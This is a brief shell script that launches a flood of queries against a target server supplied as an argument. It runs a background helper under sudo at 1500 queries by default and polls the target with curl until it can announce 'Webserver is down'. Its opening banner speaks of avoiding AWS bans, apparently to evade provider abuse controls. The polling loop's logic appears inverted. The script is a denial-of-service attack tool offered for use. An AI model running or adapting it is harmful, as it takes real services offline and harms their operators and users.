#!/bin/sh
# Christopher Gray
# Version 0.0.2
#  3/2/2020

echo "This was designed to help prevent getting BANNED/BLOCKED from AWS.. 


"

if [ -z "$1" ]; then
      echo "No dest defined to attack! please define one before continuing \r\n"
      exit
else
      server_ip=$1
      echo "Server is set to $server_ip \r\n"
fi

if [ -z "$2" ]; then
      echo "Defaulting queries to send is set to: 1500 \r\n"
      queries_ps=1500
else
      queries_ps=$2
      #echo "port = $server_port \r\n"
fi

sudo ./gen_data.sh $server_ip $queries_ps &>/dev/null &

sleep 10

until $(curl --output /dev/null --silent --head --fail http://$server_ip); do
    printf '.'
    sleep 1
done

echo "Webserver is down!!! Stopping attack"
#sudo ./kill_all_attacks.sh